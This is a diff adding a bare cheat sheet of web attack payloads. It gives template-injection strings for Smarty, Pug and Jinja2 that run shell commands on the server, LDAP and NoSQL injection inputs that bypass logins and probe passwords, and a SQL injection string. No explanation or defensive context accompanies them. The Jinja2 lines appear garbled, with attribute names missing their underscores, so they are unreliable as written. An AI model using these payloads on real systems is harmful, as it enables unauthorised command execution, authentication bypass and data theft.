@@ -1,1 +1,29 @@
+php - Smarty
+{'Hello'|upper}
+{system("ls")}
+{system("cat file.txt")}
 
+NodeJS - Pug
+#{7*7}
+#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
+#{root.process.mainModule.require('child_process').spawnSync('cat', ['file.txt']).stdout}
+
+Python - Jinja2
+{{7*7}}
+{{"".class.mro[1].subclasses()[157].repr.globals.get("builtins").get("import")("subprocess").check_output(['ls', '-lah'])}}
+{{"".class.mro[1].subclasses()[157].repr.globals.get("builtins").get("import")("subprocess").check_output(['cat', 'file.txt'])}}
+
+
+LDAP
+LOGIN: x*        PASSWORD: *
+LOGIN: x*)(|(&    PASSWORD: pwd)
+
+
+NOSQL
+username[$ne]=user123&password[$ne]=pass123 
+username[$nin][]=user123&password[$ne]=pass123 
+username=user123&password[$regex]=^.{7}$ 
+username=user123&password[$regex]=^a......$
+
+SQL
+' OR 1=1--
